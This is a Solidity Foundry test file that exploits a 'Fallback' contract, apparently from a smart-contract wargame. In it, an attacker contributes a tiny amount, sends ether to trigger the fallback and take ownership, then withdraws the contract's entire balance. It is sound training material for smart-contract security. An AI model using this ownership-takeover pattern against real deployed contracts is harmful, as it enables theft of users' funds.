// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "../../src/fallback/Fallback.sol";

contract FallbackAttack is Test {
    uint256 public constant ADDRESS_POT = 5 ether;
    uint256 initial_attacker_balance;
    address deployer;
    address attacker;
    Fallback fallbackEx;

    function setUp() public {
        deployer = makeAddr("deployer");
        attacker = makeAddr("attacker");
        vm.deal(deployer, 10 ether);
        vm.deal(attacker, 10 ether);
    
        vm.prank(deployer);
        fallbackEx = new Fallback();
        vm.deal(address(fallbackEx), ADDRESS_POT);
    }

    function test_attack() public {
        vm.startPrank(attacker);
        initial_attacker_balance = attacker.balance;

        fallbackEx.contribute{value: 0.0001 ether}();
        (bool success, ) = address(fallbackEx).call{value: 1 ether}("");
        assertTrue(success);

        assertEq(fallbackEx.owner(), attacker);
        fallbackEx.withdraw();

        vm.stopPrank();
        
        assertEq(address(fallbackEx).balance, 0);
        assertGt(attacker.balance, initial_attacker_balance );
        
    }
}
